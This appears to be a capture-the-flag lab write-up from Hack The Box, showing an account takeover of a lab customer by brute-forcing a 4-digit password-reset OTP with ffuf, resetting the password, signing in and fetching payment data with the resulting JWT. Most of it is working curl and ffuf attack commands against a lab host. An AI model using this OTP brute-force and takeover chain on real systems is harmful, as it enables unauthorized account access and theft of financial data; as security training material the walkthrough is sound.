# [Broken Authentication](Broken%20Authentication.md)
### Exploit another Broken Authentication vulnerability to gain unauthorized access to the customer with the email 'MasonJenkins@ymail.com'. Retrieve their payment options data and submit the flag.

Sign in with the credentials `htbpentester3@hackthebox.com:HTBPentester3`
![](Screenshot%202026-09-14%20at%2016.56.45.png)

Authorize with JWT token

![](Screenshot%202026-09-14%20at%2016.59.02.png)

![](Screenshot%202026-09-14%20at%2017.00.02.png)

Get all information of customers

![](Screenshot%202026-09-14%20at%2017.00.36.png)

Trigger server to create OTP

```sh
curl -s -i -X POST 'http://154.57.164.78:31329/api/v1/authentication/customers/passwords/resets/email-otps' \
  -H 'Content-Type: application/json' \
  -d '{"Email":"MasonJenkins@ymail.com"}'
```
![](Screenshot%202026-09-15%20at%2013.11.56.png)

Get the baseline failed-reset response

```sh
curl -s -X POST 'http://154.57.164.78:31329/api/v1/authentication/customers/passwords/resets' \
-H 'Content-Type: application/json' \
-d '{"Email":"MasonJenkins@ymail.com","OTP":"0000","NewPassword":"NewP@ssw0rd1"}' -w '%{size_download}\n' -o /dev/null
```
![](Screenshot%202026-09-15%20at%2013.13.24.png)

Brute-force 4-digit OTPs with ffuf

```sh
ffuf -u 'http://154.57.164.78:31329/api/v1/authentication/customers/passwords/resets' \
-X POST \
-H 'Content-Type: application/json' \
-d '{"Email":"MasonJenkins@ymail.com","OTP":"FUZZ","NewPassword":"NewP@ssw0rd1"}' \
-w <(seq -w 0 9999):FUZZ \
-t 100 \
-mr '"SuccessStatus"\s*:\s*true|"accessToken"|"token"|"jwt"|"passwordChanged"|"success"' \
-v
```
![](Screenshot%202026-09-15%20at%2013.15.31.png)

Redeem the winning OTP

```sh
curl -s -i -X POST 'http://154.57.164.78:31329/api/v1/authentication/customers/passwords/resets' \
-H 'Content-Type: application/json' \
-d '{"Email":"MasonJenkins@ymail.com","OTP":"7480","NewPassword":"NewP@ssw0rd1"}' | sed -n '1,240p'
```
![](Screenshot%202026-09-15%20at%2013.16.34.png)

Get MasonJenkins's JWT Token

```sh
curl -s -X POST 'http://154.57.164.78:31329/api/v1/authentication/customers/sign-in' \
-H 'Content-Type: application/json' \
-d '{"Email":"MasonJenkins@ymail.com","Password":"NewP@ssw0rd1"}'
```
![](Screenshot%202026-09-15%20at%2013.19.09.png)

Login to obtain flag

```sh
curl -s -X GET 'http://154.57.164.78:31329/api/v1/customers/payment-options/current-user' \
-H 'accept: application/json' \
-H 'Authorization: Bearer eyJhbGciOiJIUzUxMiIsInR5cCI6IkpXVCJ9.eyJodHRwOi8vc2NoZW1hcy54bWxzb2FwLm9yZy93cy8yMDA1LzA1L2lkZW50aXR5L2NsYWltcy9uYW1laWRlbnRpZmllciI6Ik1hc29uSmVua2luc0B5bWFpbC5jb20iLCJleHAiOjE3ODk0NTQzMzUsImlzcyI6Imh0dHA6Ly9hcGkuaW5sYW5lZnJlaWdodC5odGIiLCJhdWQiOiJodHRwOi8vYXBpLmlubGFuZWZyZWlnaHQuaHRiIn0.Z2nttyj6x0Cc4NlhE_usb5i2QnWZuV8H4rVBxGGV0xT6itZox_p1BdYx4-g5OBULlwXbeqJdxerltShkulnFQg'
```
![](Screenshot%202026-09-15%20at%2013.20.34.png)